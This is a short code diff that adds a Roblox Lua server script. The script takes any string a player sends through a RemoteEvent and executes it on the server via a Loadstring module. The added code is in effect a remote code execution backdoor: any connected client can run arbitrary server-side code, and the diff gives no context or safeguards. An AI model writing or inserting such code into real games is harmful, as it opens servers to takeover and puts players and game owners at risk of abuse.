@@ -1,0 +1,3 @@
+script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr,Guy)
+	require(script.Loadstring)(Guy)()
+end)
